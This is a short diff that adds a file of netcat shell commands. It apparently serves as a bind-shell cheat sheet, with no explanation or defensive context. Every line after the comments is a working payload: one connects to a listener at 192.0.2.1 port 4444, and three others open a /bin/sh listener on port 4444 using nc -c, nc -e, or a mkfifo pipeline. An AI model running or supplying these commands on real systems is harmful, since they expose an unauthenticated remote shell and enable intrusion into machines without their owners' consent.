@@ -1,0 +1,7 @@
+# Connect to bind shell
+nc 192.0.2.1 4444
+
+# Netcat bind shells
+nc -nlp 4444 -c sh
+nc -nlp 4444 -e /bin/sh
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nlp 4444 > /tmp/f
